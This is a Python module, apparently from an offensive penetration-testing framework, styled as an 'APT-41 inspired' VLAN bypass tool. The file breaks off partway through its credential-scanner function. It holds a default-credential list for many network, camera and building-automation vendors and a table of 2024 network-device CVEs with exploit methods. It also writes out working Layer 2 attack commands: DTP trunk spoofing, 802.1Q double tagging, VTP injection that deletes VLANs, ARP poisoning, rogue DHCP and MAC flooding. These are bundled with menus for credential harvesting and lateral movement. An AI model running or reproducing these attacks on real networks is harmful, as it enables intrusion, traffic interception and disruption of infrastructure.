"""APT-41 Inspired VLAN Bypass Module

Advanced VLAN bypass methodologies for security testing:
- Default credential attacks on network infrastructure
- VLAN hopping techniques (802.1Q, DTP, VTP)
- Recent 2024/2025 CVEs for network device exploitation
- Layer 2 attack vectors

Classification: Security Research / Authorized Testing Only
Based on APT-41 TTPs and modern network attack research.

MITRE ATT&CK Mappings:
- T1599: Network Boundary Bridging
- T1599.001: Network Address Translation Traversal
- T1557: Adversary-in-the-Middle
- T1557.002: ARP Cache Poisoning
- T1018: Remote System Discovery
- T1046: Network Service Discovery
"""

import socket
import struct
import time
import json
import subprocess
import threading
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from pathlib import Path
from dataclasses import dataclass, field
from enum import Enum
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm
from rich import box
from rich.tree import Tree
from rich.text import Text

from modules.utils import execute_cmd, execute_powershell

# Lazy imports to avoid circular dependencies
def get_identity_module():
    from modules.identity import IdentityModule
    return IdentityModule

def get_lateral_module():
    from modules.lateral import LateralModule
    return LateralModule

def get_foothold_module():
    from modules.foothold import FootholdModule
    return FootholdModule


# ============================================================================
# DEFAULT CREDENTIALS DATABASE
# ============================================================================

class DeviceType(Enum):
    """Network device types"""
    SWITCH = "switch"
    ROUTER = "router"
    FIREWALL = "firewall"
    AP = "access_point"
    CONTROLLER = "controller"
    MANAGEMENT = "management"
    IOT = "iot"
    CAMERA = "camera"
    PRINTER = "printer"


@dataclass
class DefaultCredential:
    """Default credential entry"""
    vendor: str
    device_type: DeviceType
    username: str
    password: str
    protocol: str  # ssh, telnet, http, https, snmp
    port: int
    notes: str = ""
    cve_related: str = ""


# Comprehensive default credentials database
DEFAULT_CREDENTIALS: List[DefaultCredential] = [
    # Generic/Common
    DefaultCredential("Generic", DeviceType.SWITCH, "test", "test", "ssh", 22, "Common test credentials"),
    DefaultCredential("Generic", DeviceType.SWITCH, "admin", "admin", "ssh", 22, "Common default"),
    DefaultCredential("Generic", DeviceType.SWITCH, "admin", "password", "ssh", 22, "Common default"),
    DefaultCredential("Generic", DeviceType.SWITCH, "admin", "", "ssh", 22, "Empty password"),
    DefaultCredential("Generic", DeviceType.SWITCH, "root", "root", "ssh", 22, "Root default"),
    DefaultCredential("Generic", DeviceType.SWITCH, "root", "", "ssh", 22, "Root no password"),
    DefaultCredential("Generic", DeviceType.SWITCH, "user", "user", "ssh", 22, "User default"),
    
    # Cisco
    DefaultCredential("Cisco", DeviceType.SWITCH, "cisco", "cisco", "ssh", 22, "Cisco default"),
    DefaultCredential("Cisco", DeviceType.SWITCH, "admin", "cisco", "ssh", 22, "Cisco admin"),
    DefaultCredential("Cisco", DeviceType.SWITCH, "cisco", "cisco123", "ssh", 22, "Common Cisco"),
    DefaultCredential("Cisco", DeviceType.ROUTER, "admin", "admin", "ssh", 22, "Router default"),
    DefaultCredential("Cisco", DeviceType.SWITCH, "", "", "telnet", 23, "No auth Telnet"),
    DefaultCredential("Cisco", DeviceType.SWITCH, "public", "", "snmp", 161, "SNMP public community", "CVE-2017-6736"),
    DefaultCredential("Cisco", DeviceType.SWITCH, "private", "", "snmp", 161, "SNMP private community"),
    DefaultCredential("Cisco", DeviceType.FIREWALL, "pix", "cisco", "ssh", 22, "PIX default"),
    DefaultCredential("Cisco", DeviceType.FIREWALL, "admin", "Admin123", "https", 443, "Firepower default"),
    DefaultCredential("Cisco", DeviceType.AP, "Cisco", "Cisco", "http", 80, "AP default"),
    DefaultCredential("Cisco", DeviceType.CONTROLLER, "admin", "admin", "https", 443, "WLC default"),
    
    # Juniper
    DefaultCredential("Juniper", DeviceType.SWITCH, "root", "juniper123", "ssh", 22, "Juniper default"),
    DefaultCredential("Juniper", DeviceType.ROUTER, "admin", "abc123", "ssh", 22, "SRX default"),
    DefaultCredential("Juniper", DeviceType.SWITCH, "super", "juniper123", "ssh", 22, "Super user"),
    
    # HP/Aruba
    DefaultCredential("HP/Aruba", DeviceType.SWITCH, "admin", "", "ssh", 22, "HP ProCurve"),
    DefaultCredential("HP/Aruba", DeviceType.SWITCH, "manager", "", "ssh", 22, "HP Manager"),
    DefaultCredential("HP/Aruba", DeviceType.SWITCH, "operator", "", "ssh", 22, "HP Operator"),
    DefaultCredential("HP/Aruba", DeviceType.AP, "admin", "admin", "https", 4343, "Aruba AP"),
    DefaultCredential("HP/Aruba", DeviceType.CONTROLLER, "admin", "admin", "https", 4343, "Aruba Controller"),
    
    # Dell
    DefaultCredential("Dell", DeviceType.SWITCH, "admin", "admin", "ssh", 22, "Dell default"),
    DefaultCredential("Dell", DeviceType.SWITCH, "admin", "Dell1234", "ssh", 22, "Dell PowerSwitch"),
    DefaultCredential("Dell", DeviceType.MANAGEMENT, "root", "calvin", "https", 443, "iDRAC default"),
    
    # Fortinet
    DefaultCredential("Fortinet", DeviceType.FIREWALL, "admin", "", "ssh", 22, "FortiGate default"),
    DefaultCredential("Fortinet", DeviceType.FIREWALL, "admin", "admin", "https", 443, "FortiGate web"),
    DefaultCredential("Fortinet", DeviceType.SWITCH, "admin", "", "ssh", 22, "FortiSwitch"),
    DefaultCredential("Fortinet", DeviceType.AP, "admin", "", "https", 443, "FortiAP"),
    
    # Palo Alto
    DefaultCredential("Palo Alto", DeviceType.FIREWALL, "admin", "admin", "https", 443, "PAN-OS default"),
    DefaultCredential("Palo Alto", DeviceType.FIREWALL, "admin", "paloalto", "ssh", 22, "Common PAN"),
    
    # MikroTik
    DefaultCredential("MikroTik", DeviceType.ROUTER, "admin", "", "ssh", 22, "RouterOS default"),
    DefaultCredential("MikroTik", DeviceType.ROUTER, "admin", "", "http", 80, "Winbox web"),
    DefaultCredential("MikroTik", DeviceType.ROUTER, "admin", "", "api", 8728, "API default"),
    
    # Ubiquiti
    DefaultCredential("Ubiquiti", DeviceType.SWITCH, "ubnt", "ubnt", "ssh", 22, "UniFi default"),
    DefaultCredential("Ubiquiti", DeviceType.AP, "ubnt", "ubnt", "ssh", 22, "UAP default"),
    DefaultCredential("Ubiquiti", DeviceType.ROUTER, "ubnt", "ubnt", "ssh", 22, "EdgeRouter"),
    
    # Netgear
    DefaultCredential("Netgear", DeviceType.SWITCH, "admin", "password", "http", 80, "Netgear default"),
    DefaultCredential("Netgear", DeviceType.SWITCH, "admin", "1234", "http", 80, "Netgear alt"),
    
    # TP-Link
    DefaultCredential("TP-Link", DeviceType.SWITCH, "admin", "admin", "http", 80, "TP-Link default"),
    DefaultCredential("TP-Link", DeviceType.AP, "admin", "admin", "http", 80, "TP-Link AP"),
    
    # D-Link
    DefaultCredential("D-Link", DeviceType.SWITCH, "admin", "", "http", 80, "D-Link no pass"),
    DefaultCredential("D-Link", DeviceType.SWITCH, "admin", "admin", "http", 80, "D-Link default"),
    
    # Extreme Networks
    DefaultCredential("Extreme", DeviceType.SWITCH, "admin", "", "ssh", 22, "ExtremeXOS"),
    DefaultCredential("Extreme", DeviceType.SWITCH, "admin", "abc123", "ssh", 22, "Common Extreme"),
    
    # Brocade
    DefaultCredential("Brocade", DeviceType.SWITCH, "admin", "password", "ssh", 22, "ICX default"),
    DefaultCredential("Brocade", DeviceType.SWITCH, "admin", "brocade1", "ssh", 22, "FC Switch"),
    
    # VMware NSX
    DefaultCredential("VMware", DeviceType.SWITCH, "admin", "default", "https", 443, "NSX default"),
    DefaultCredential("VMware", DeviceType.MANAGEMENT, "admin", "VMware1!", "https", 443, "vCenter default"),
    
    # IoT/Cameras
    DefaultCredential("Hikvision", DeviceType.CAMERA, "admin", "12345", "http", 80, "Hikvision default", "CVE-2021-36260"),
    DefaultCredential("Hikvision", DeviceType.CAMERA, "admin", "admin12345", "http", 80, "New Hikvision"),
    DefaultCredential("Dahua", DeviceType.CAMERA, "admin", "admin", "http", 80, "Dahua default", "CVE-2021-33044"),
    DefaultCredential("Axis", DeviceType.CAMERA, "root", "pass", "http", 80, "Axis default"),
    DefaultCredential("Reolink", DeviceType.CAMERA, "admin", "", "http", 80, "Reolink default", "CVE-2022-21236"),
    
    # Printers
    DefaultCredential("HP", DeviceType.PRINTER, "admin", "", "http", 80, "HP Printer"),
    DefaultCredential("HP", DeviceType.PRINTER, "admin", "admin", "http", 80, "HP alt"),
    DefaultCredential("Xerox", DeviceType.PRINTER, "admin", "1111", "http", 80, "Xerox default"),
    DefaultCredential("Canon", DeviceType.PRINTER, "7654321", "7654321", "http", 80, "Canon default"),
    DefaultCredential("Brother", DeviceType.PRINTER, "admin", "access", "http", 80, "Brother default"),
    
    # Building Automation / HVAC / BACnet
    DefaultCredential("Honeywell", DeviceType.IOT, "admin", "admin", "http", 80, "Honeywell BMS"),
    DefaultCredential("Johnson Controls", DeviceType.IOT, "admin", "admin", "http", 80, "Metasys"),
    DefaultCredential("Schneider", DeviceType.IOT, "USER", "USER", "http", 80, "Building Expert"),
    DefaultCredential("Siemens", DeviceType.IOT, "admin", "admin", "http", 80, "Desigo CC"),
    DefaultCredential("Tridium", DeviceType.IOT, "admin", "admin", "http", 80, "Niagara default"),
]


# ============================================================================
# 2024/2025 CVE DATABASE FOR VLAN/NETWORK BYPASS
# ============================================================================

@dataclass
class NetworkCVE:
    """CVE entry for network device exploitation"""
    cve_id: str
    vendor: str
    product: str
    description: str
    cvss_score: float
    attack_vector: str
    exploit_available: bool
    vlan_bypass: bool  # Can be used for VLAN bypass
    auth_bypass: bool  # Authentication bypass
    rce: bool  # Remote code execution
    published_date: str
    exploit_method: str = ""
    mitigations: List[str] = field(default_factory=list)


# 2024/2025 CVEs relevant to VLAN bypass and network exploitation
NETWORK_CVES: List[NetworkCVE] = [
    # Cisco CVEs 2024/2025
    NetworkCVE(
        cve_id="CVE-2024-20359",
        vendor="Cisco",
        product="ASA/FTD",
        description="Arbitrary code execution through management and VPN web servers",
        cvss_score=9.8,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=True,
        rce=True,
        published_date="2024-04",
        exploit_method="Send crafted HTTP request to management interface",
        mitigations=["Upgrade to patched version", "Restrict management access"]
    ),
    NetworkCVE(
        cve_id="CVE-2024-20353",
        vendor="Cisco",
        product="ASA/FTD",
        description="Denial of service and potential bypass of security controls",
        cvss_score=8.6,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=False,
        rce=False,
        published_date="2024-04",
        exploit_method="Crafted HTTPS requests causing reload",
        mitigations=["Apply security patches"]
    ),
    NetworkCVE(
        cve_id="CVE-2024-20356",
        vendor="Cisco",
        product="IMC",
        description="Command injection in Integrated Management Controller",
        cvss_score=8.8,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=False,
        rce=True,
        published_date="2024-04",
        exploit_method="Authenticated command injection through web interface",
        mitigations=["Upgrade firmware", "Network segmentation"]
    ),
    NetworkCVE(
        cve_id="CVE-2024-20399",
        vendor="Cisco",
        product="NX-OS",
        description="CLI command injection allowing root shell access",
        cvss_score=6.7,
        attack_vector="Local",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=False,
        rce=True,
        published_date="2024-07",
        exploit_method="Inject commands through CLI arguments",
        mitigations=["Upgrade NX-OS", "Limit CLI access"]
    ),
    NetworkCVE(
        cve_id="CVE-2024-20419",
        vendor="Cisco",
        product="Smart Software Manager",
        description="Static credentials allowing unauthorized access",
        cvss_score=10.0,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=False,
        auth_bypass=True,
        rce=True,
        published_date="2024-07",
        exploit_method="Use hardcoded credentials for admin access",
        mitigations=["Upgrade immediately"]
    ),
    
    # Fortinet CVEs 2024/2025
    NetworkCVE(
        cve_id="CVE-2024-21762",
        vendor="Fortinet",
        product="FortiOS SSL-VPN",
        description="Out-of-bound write enabling RCE without authentication",
        cvss_score=9.8,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=True,
        rce=True,
        published_date="2024-02",
        exploit_method="Heap overflow in SSL-VPN pre-auth",
        mitigations=["Upgrade FortiOS", "Disable SSL-VPN if unused"]
    ),
    NetworkCVE(
        cve_id="CVE-2024-23113",
        vendor="Fortinet",
        product="FortiOS",
        description="Format string vulnerability in fgfmd daemon",
        cvss_score=9.8,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=True,
        rce=True,
        published_date="2024-02",
        exploit_method="Send crafted requests to FortiGate-FortiManager protocol",
        mitigations=["Upgrade FortiOS", "Block fgfm port"]
    ),
    NetworkCVE(
        cve_id="CVE-2024-47575",
        vendor="Fortinet",
        product="FortiManager",
        description="Missing authentication in fgfmd daemon - FortiJump",
        cvss_score=9.8,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=True,
        rce=True,
        published_date="2024-10",
        exploit_method="Register rogue FortiGate to steal credentials",
        mitigations=["Upgrade FortiManager", "Restrict fgfm access"]
    ),
    
    # Palo Alto CVEs 2024
    NetworkCVE(
        cve_id="CVE-2024-3400",
        vendor="Palo Alto",
        product="PAN-OS GlobalProtect",
        description="Command injection in GlobalProtect enabling root RCE",
        cvss_score=10.0,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=True,
        rce=True,
        published_date="2024-04",
        exploit_method="Craft malicious SESSID cookie for path traversal + command injection",
        mitigations=["Apply hotfix", "Enable threat signatures"]
    ),
    NetworkCVE(
        cve_id="CVE-2024-0012",
        vendor="Palo Alto",
        product="PAN-OS Management Interface",
        description="Authentication bypass allowing admin access",
        cvss_score=9.8,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=True,
        rce=False,
        published_date="2024-11",
        exploit_method="Bypass authentication through management web interface",
        mitigations=["Upgrade PAN-OS", "Restrict management access"]
    ),
    NetworkCVE(
        cve_id="CVE-2024-9474",
        vendor="Palo Alto",
        product="PAN-OS",
        description="Privilege escalation to root through command injection",
        cvss_score=7.2,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=False,
        rce=True,
        published_date="2024-11",
        exploit_method="Chain with CVE-2024-0012 for unauthenticated root",
        mitigations=["Upgrade PAN-OS"]
    ),
    
    # Ivanti/Pulse CVEs 2024
    NetworkCVE(
        cve_id="CVE-2024-21887",
        vendor="Ivanti",
        product="Connect Secure/Policy Secure",
        description="Command injection in web components",
        cvss_score=9.1,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=False,
        rce=True,
        published_date="2024-01",
        exploit_method="Authenticated command injection through web interface",
        mitigations=["Apply patches", "Use external integrity checker"]
    ),
    NetworkCVE(
        cve_id="CVE-2024-21893",
        vendor="Ivanti",
        product="Connect Secure/Policy Secure",
        description="SSRF in SAML component enabling auth bypass",
        cvss_score=8.2,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=True,
        rce=False,
        published_date="2024-01",
        exploit_method="SSRF through SAML to access internal resources",
        mitigations=["Apply patches immediately"]
    ),
    NetworkCVE(
        cve_id="CVE-2024-22024",
        vendor="Ivanti",
        product="Connect Secure",
        description="XXE vulnerability enabling arbitrary file read",
        cvss_score=8.3,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=True,
        rce=False,
        published_date="2024-02",
        exploit_method="XXE in SAML component",
        mitigations=["Upgrade to patched version"]
    ),
    
    # Juniper CVEs 2024
    NetworkCVE(
        cve_id="CVE-2024-21591",
        vendor="Juniper",
        product="Junos OS SRX/EX",
        description="Out-of-bounds write in J-Web enabling RCE",
        cvss_score=9.8,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=True,
        rce=True,
        published_date="2024-01",
        exploit_method="Heap overflow through crafted HTTP request",
        mitigations=["Disable J-Web", "Upgrade Junos OS"]
    ),
    NetworkCVE(
        cve_id="CVE-2024-21619",
        vendor="Juniper",
        product="Junos OS J-Web",
        description="Missing authentication for critical function",
        cvss_score=7.5,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=False,
        auth_bypass=True,
        rce=False,
        published_date="2024-01",
        exploit_method="Access configuration without auth",
        mitigations=["Disable J-Web", "Apply patches"]
    ),
    
    # SonicWall CVEs 2024
    NetworkCVE(
        cve_id="CVE-2024-40766",
        vendor="SonicWall",
        product="SonicOS",
        description="Improper access control in SSLVPN",
        cvss_score=9.3,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=True,
        rce=False,
        published_date="2024-08",
        exploit_method="Access management from SSLVPN zone",
        mitigations=["Upgrade SonicOS", "Restrict SSLVPN access"]
    ),
    
    # Zyxel CVEs 2024
    NetworkCVE(
        cve_id="CVE-2024-29973",
        vendor="Zyxel",
        product="NAS Devices",
        description="Command injection in CGI programs",
        cvss_score=9.8,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=True,
        rce=True,
        published_date="2024-06",
        exploit_method="Inject commands through web parameter",
        mitigations=["Upgrade firmware"]
    ),
    
    # D-Link CVEs 2024
    NetworkCVE(
        cve_id="CVE-2024-3273",
        vendor="D-Link",
        product="NAS Devices",
        description="Backdoor account and command injection",
        cvss_score=9.8,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=True,
        rce=True,
        published_date="2024-04",
        exploit_method="Use hardcoded backdoor account",
        mitigations=["Replace device (EOL)"]
    ),
    
    # QNAP CVEs 2024
    NetworkCVE(
        cve_id="CVE-2024-27130",
        vendor="QNAP",
        product="QTS/QuTS hero",
        description="Stack buffer overflow in share.cgi",
        cvss_score=8.8,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=False,
        rce=True,
        published_date="2024-05",
        exploit_method="Buffer overflow through network share",
        mitigations=["Upgrade QTS firmware"]
    ),
    
    # VMware CVEs 2024
    NetworkCVE(
        cve_id="CVE-2024-22252",
        vendor="VMware",
        product="ESXi/Workstation/Fusion",
        description="Use-after-free in XHCI USB controller",
        cvss_score=9.3,
        attack_vector="Local",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=False,
        rce=True,
        published_date="2024-03",
        exploit_method="Guest-to-host escape through USB",
        mitigations=["Apply patches", "Disable USB"]
    ),
    
    # Aruba/HPE CVEs 2024
    NetworkCVE(
        cve_id="CVE-2024-26304",
        vendor="Aruba/HPE",
        product="ArubaOS",
        description="Buffer overflow in L2/L3 management service",
        cvss_score=9.8,
        attack_vector="Network",
        exploit_available=True,
        vlan_bypass=True,
        auth_bypass=True,
        rce=True,
        published_date="2024-05",
        exploit_method="Heap overflow in PAPI protocol",
        mitigations=["Upgrade ArubaOS", "Restrict PAPI access"]
    ),
]


# ============================================================================
# VLAN HOPPING TECHNIQUES
# ============================================================================

@dataclass
class VLANHopTechnique:
    """VLAN hopping technique definition"""
    name: str
    description: str
    attack_type: str  # switch_spoofing, double_tagging, dtp, vtp, arp, dhcp
    prerequisites: List[str]
    commands: List[str]
    mitre_technique: str
    success_indicators: List[str]
    countermeasures: List[str]


VLAN_HOP_TECHNIQUES: List[VLANHopTechnique] = [
    VLANHopTechnique(
        name="DTP Switch Spoofing",
        description="Negotiate trunk link using Dynamic Trunking Protocol to access all VLANs",
        attack_type="dtp",
        prerequisites=[
            "Target switch has DTP enabled (default on many Cisco switches)",
            "Attacker on access port that can be negotiated to trunk",
            "Network access to switch port"
        ],
        commands=[
            "# Using yersinia for DTP attack",
            "yersinia dtp -attack 1 -interface eth0",
            "",
            "# Using Scapy for manual DTP negotiation",
            "from scapy.all import *",
            "from scapy.contrib.dtp import *",
            "sendp(Dot3(dst='01:00:0c:cc:cc:cc')/LLC()/SNAP()/DTP(tlvlist=[DTPDomain(),DTPStatus(),DTPType(),DTPNeighbor()]), iface='eth0', loop=1)",
            "",
            "# Verify trunk established",
            "ip link show eth0.100  # Check VLAN subinterface"
        ],
        mitre_technique="T1599.001",
        success_indicators=[
            "Interface transitions to trunk mode",
            "Can see traffic from multiple VLANs",
            "VLAN subinterfaces can be created"
        ],
        countermeasures=[
            "Disable DTP: switchport nonegotiate",
            "Set ports as access: switchport mode access",
            "Disable unused ports"
        ]
    ),
    VLANHopTechnique(
        name="802.1Q Double Tagging",
        description="Encapsulate frame with two 802.1Q tags to hop to target VLAN",
        attack_type="double_tagging",
        prerequisites=[
            "Attacker on native VLAN of trunk link",
            "Target VLAN different from native VLAN",
            "Switch vulnerable to double tag processing"
        ],
        commands=[
            "# Using Scapy for double tagging",
            "from scapy.all import *",
            "",
            "# Create double-tagged frame (native VLAN 1, target VLAN 100)",
            "pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst='10.10.100.1')/ICMP()",
            "sendp(pkt, iface='eth0')",
            "",
            "# Using yersinia",
            "yersinia 802.1q -attack 1 -vlan1 1 -vlan2 100",
        ],
        mitre_technique="T1599.001",
        success_indicators=[
            "ICMP response from target VLAN",
            "Can reach hosts in target VLAN"
        ],
        countermeasures=[
            "Change native VLAN to unused VLAN",
            "Tag native VLAN: vlan dot1q tag native",
            "Use dedicated VLAN for trunks"
        ]
    ),
    VLANHopTechnique(
        name="VTP Domain Injection",
        description="Inject VTP messages to manipulate VLAN database across switches",
        attack_type="vtp",
        prerequisites=[
            "VTP enabled in transparent or client mode",
            "VTP domain name known or guessable",
            "Network access to trunk port"
        ],
        commands=[
            "# Using yersinia for VTP attack",
            "yersinia vtp -attack 1 -domain 'CORP' -interface eth0",
            "",
            "# Manual VTP injection with Scapy",
            "from scapy.all import *",
            "from scapy.contrib.vtp import *",
            "",
            "# Delete all VLANs (dangerous!)",
            "vtp = VTP(version=1, code=2, domain='CORP', revision=99999)",
            "sendp(vtp, iface='eth0')"
        ],
        mitre_technique="T1599",
        success_indicators=[
            "VLAN database changes propagate",
            "VLANs appear/disappear across network"
        ],
        countermeasures=[
            "Use VTP version 3 with passwords",
            "Set VTP mode to transparent",
            "Disable VTP: no vtp domain"
        ]
    ),
    VLANHopTechnique(
        name="ARP Cache Poisoning Cross-VLAN",
        description="Poison ARP cache of gateway to intercept cross-VLAN traffic",
        attack_type="arp",
        prerequisites=[
            "Same VLAN as default gateway",
            "IP forwarding capability",
            "Traffic destined for other VLANs through gateway"
        ],
        commands=[
            "# Enable IP forwarding",
            "echo 1 > /proc/sys/net/ipv4/ip_forward",
            "",
            "# ARP poison with arpspoof",
            "arpspoof -i eth0 -t 10.10.10.1 -r 10.10.10.100",
            "",
            "# Using ettercap",
            "ettercap -T -q -i eth0 -M arp:remote /10.10.10.1// /10.10.10.100//",
            "",
            "# Capture cross-VLAN traffic",
            "tcpdump -i eth0 -w capture.pcap"
        ],
        mitre_technique="T1557.002",
        success_indicators=[
            "Traffic from other VLANs visible",
            "Can intercept inter-VLAN routing"
        ],
        countermeasures=[
            "Dynamic ARP Inspection (DAI)",
            "DHCP Snooping",
            "Private VLANs",
            "Static ARP entries for gateways"
        ]
    ),
    VLANHopTechnique(
        name="DHCP Starvation + Rogue DHCP",
        description="Exhaust DHCP pool and serve rogue DHCP to redirect traffic",
        attack_type="dhcp",
        prerequisites=[
            "Access to VLAN with DHCP",
            "No DHCP snooping",
            "Ability to run DHCP server"
        ],
        commands=[
            "# DHCP starvation with yersinia",
            "yersinia dhcp -attack 1 -interface eth0",
            "",
            "# Start rogue DHCP server",
            "dnsmasq --interface=eth0 --dhcp-range=10.10.10.100,10.10.10.200,12h --dhcp-option=3,10.10.10.50 --dhcp-option=6,10.10.10.50",
            "",
            "# Point gateway to attacker for inter-VLAN traffic"
        ],
        mitre_technique="T1557",
        success_indicators=[
            "Clients obtain IP from rogue DHCP",
            "Traffic routes through attacker"
        ],
        countermeasures=[
            "DHCP Snooping",
            "Port Security",
            "Rate limiting on ports"
        ]
    ),
    VLANHopTechnique(
        name="MAC Flooding CAM Overflow",
        description="Overflow CAM table to force switch into hub mode for traffic sniffing",
        attack_type="cam_overflow",
        prerequisites=[
            "No port security on switch",
            "Physical access to switch port",
            "Switch with limited CAM table"
        ],
        commands=[
            "# Using macof for MAC flooding",
            "macof -i eth0 -n 100000",
            "",
            "# Using yersinia",
            "yersinia -I eth0 -G",  # GUI mode for MAC flood
            "",
            "# Capture traffic in hub mode",
            "tcpdump -i eth0 -w hub_mode_capture.pcap"
        ],
        mitre_technique="T1040",
        success_indicators=[
            "Switch performance degrades",
            "Can see traffic from other ports"
        ],
        countermeasures=[
            "Port Security with MAC limits",
            "Sticky MAC addresses",
            "BPDU Guard"
        ]
    ),
    VLANHopTechnique(
        name="Private VLAN Proxy Attack",
        description="Bypass PVLAN isolation using proxy ARP on router",
        attack_type="pvlan",
        prerequisites=[
            "Private VLAN configured",
            "Promiscuous port accessible",
            "Proxy ARP enabled on router"
        ],
        commands=[
            "# Send traffic to router which will proxy to isolated ports",
            "# Craft packets with router as next hop",
            "from scapy.all import *",
            "# Send to router (promiscuous), router ARPs to isolated host",
            "send(IP(dst='10.10.10.1')/ICMP()/Raw(load='target:10.10.10.100'))"
        ],
        mitre_technique="T1599.001",
        success_indicators=[
            "Can communicate with isolated ports",
            "Router proxies traffic between isolated hosts"
        ],
        countermeasures=[
            "Disable proxy ARP: no ip proxy-arp",
            "Use VACL for additional filtering"
        ]
    ),
]


# ============================================================================
# VLAN BYPASS MODULE
# ============================================================================

class VLANBypassModule:
    """APT-41 Inspired VLAN Bypass Module
    
    Integrates with:
    - IdentityModule: Credential harvesting and token extraction
    - LateralModule: SMB/WinRM/WMI movement after VLAN bypass
    - FootholdModule: Initial access assessment
    - AutoEnumerator: Automatic VLAN discovery and bypass
    """
    
    def __init__(self, console: Console = None, session_data: dict = None):
        self.console = console or Console()
        self.session_data = session_data or {}
        self.discovered_devices = {}
        self.successful_creds = []
        self.vulnerable_cves = []
        self.bypass_methods = []
        self.harvested_credentials = []  # From identity module
        self.vlan_topology = {}  # Discovered VLAN structure
        self.accessible_vlans = []  # VLANs we can reach
        self.pivot_hosts = []  # Hosts useful for pivoting
        
        # Module integration
        self._identity_module = None
        self._lateral_module = None
        self._foothold_module = None
    
    @property
    def identity_module(self):
        """Lazy load identity module"""
        if self._identity_module is None:
            IdentityModule = get_identity_module()
            self._identity_module = IdentityModule()
        return self._identity_module
    
    @property
    def lateral_module(self):
        """Lazy load lateral module"""
        if self._lateral_module is None:
            LateralModule = get_lateral_module()
            self._lateral_module = LateralModule()
        return self._lateral_module
    
    @property
    def foothold_module(self):
        """Lazy load foothold module"""
        if self._foothold_module is None:
            FootholdModule = get_foothold_module()
            self._foothold_module = FootholdModule()
        return self._foothold_module
    
    def run(self, console: Console = None, session_data: dict = None):
        """Main module entry point"""
        if console:
            self.console = console
        if session_data:
            self.session_data = session_data
        
        while True:
            self._show_menu()
            choice = self._get_choice()
            
            if choice == '0':
                break
            elif choice == '1':
                self._scan_default_credentials()
            elif choice == '2':
                self._check_cve_vulnerabilities()
            elif choice == '3':
                self._vlan_hopping_techniques()
            elif choice == '4':
                self._network_device_discovery()
            elif choice == '5':
                self._apt41_attack_chain()
            elif choice == '6':
                self._generate_bypass_report()
            elif choice == '7':
                self._harvest_credentials_integration()
            elif choice == '8':
                self._lateral_movement_integration()
            elif choice == '9':
                self._vlan_topology_discovery()
            elif choice == 'h':
                self._show_help()
    
    def _show_menu(self):
        """Display module menu"""
        banner = Text()
        banner.append("APT-41 VLAN Bypass Module\n", style="bold red")
        banner.append("Advanced Network Segmentation Bypass\n\n", style="yellow")
        banner.append("⚠️  Authorized Security Testing Only\n", style="dim red")
        banner.append("Based on APT-41 TTPs and 2024/2025 CVEs\n", style="dim")
        
        self.console.print(Panel(banner, title="[bold]🔓 VLAN Bypass[/bold]", border_style="red"))
        
        table = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
        table.add_column("Option", style="cyan", width=4)
        table.add_column("Function", style="white", width=35)
        table.add_column("Description", style="dim", width=45)
        
        options = [
            ("1", "Default Credential Scanner", "Test common/default credentials (test:test first)"),
            ("2", "CVE Vulnerability Check", "Check for 2024/2025 network CVEs"),
            ("3", "VLAN Hopping Techniques", "DTP, Double-Tag, VTP, ARP attacks"),
            ("4", "Network Device Discovery", "Discover switches, routers, firewalls"),
            ("5", "APT-41 Attack Chain", "Full attack chain simulation"),
            ("6", "Generate Bypass Report", "Create comprehensive report"),
            ("7", "Credential Harvesting", "Integration with Identity Module"),
            ("8", "Post-Bypass Lateral Movement", "Integration with Lateral Module"),
            ("9", "VLAN Topology Discovery", "Map VLAN structure and routing"),
            ("h", "Help & Guidance", "Detailed usage instructions"),
            ("0", "Exit", "Return to main menu"),
        ]
        
        for opt, func, desc in options:
            table.add_row(opt, func, desc)
        
        self.console.print(table)
    
    def _get_choice(self) -> str:
        """Get user choice"""
        return Prompt.ask("[bold cyan]Select option[/bold cyan]", default="0")
    
    def _scan_default_credentials(self):
        """Scan for default credentials"""
        self.console.print("\n[bold cyan]Default Credential Scanner[/bold cyan]\n")
        
        target = Prompt.ask("Enter target IP or range", default="10.10.10.0/24")
        
        # Show credential database
        self.console.print("\n[bold]Credential Database Summary:[/bold]")
        
        vendor_counts = {}
        for cred in DEFAULT_CREDENTIALS:
            vendor_counts[cred.vendor] = vendor_counts.get(cred.vendor, 0) + 1
        
        cred_table = Table(box=box.SIMPLE)
        cred_table.add_column("Vendor", style="cyan")
        cred_table.add_column("Credentials", style="green", justify="right")
        
        for vendor, count in sorted(vendor_counts.items()):
            cred_table.add_row(vendor, str(count))
        
        cred_table.add_row("[bold]TOTAL[/bold]", f"[bold]{len(DEFAULT_CREDENTIALS)}[/bold]")
        self.console.print(cred_table)
        
        # Priority credentials (test:test first)
        priority_creds = [c for c in DEFAULT_CREDENTIALS if c.username == "test" and c.password == "test"]
